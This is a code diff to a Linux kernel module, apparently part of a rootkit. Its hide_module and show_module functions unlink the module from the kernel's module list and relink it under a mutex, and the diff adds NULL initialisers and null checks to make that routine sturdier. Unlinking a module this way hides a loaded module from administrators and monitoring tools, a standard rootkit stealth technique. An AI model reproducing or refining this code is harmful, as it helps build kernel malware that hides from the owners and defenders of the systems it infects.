@@ -1,10 +1,10 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 
-static struct module	*me;
-static struct mutex		*_module_mutex;
-static struct list_head *mod_lst;
-static char	hidden	= 0;
+static struct module	*me				= NULL;
+static struct mutex		*_module_mutex 	= NULL;
+static struct list_head *mod_lst		= NULL;
+static char	hidden						= 0;
 
 void hidemod_setmutex(unsigned long mutex_addr)
 {
@@ -28,10 +28,12 @@ void hide_module(void)
 	if(hidden)
 		return;
 	
-	mutex_lock(_module_mutex);
+	if(_module_mutex)
+		mutex_lock(_module_mutex);
 	hidden = 1;
 	list_del(&(me->list));
-	mutex_unlock(_module_mutex);
+	if(_module_mutex)
+		mutex_unlock(_module_mutex);
 }
 
 // Re-inserts this module in the list.
@@ -40,9 +42,11 @@ void show_module(void)
 	if(!hidden)
 		return;
 
-	mutex_lock(_module_mutex);
+	if(_module_mutex)
+		mutex_lock(_module_mutex);
 	hidden = 0;
 	list_add(&(me->list), mod_lst);
-	mutex_unlock(_module_mutex);
+	if(_module_mutex)
+		mutex_unlock(_module_mutex);
 }
 
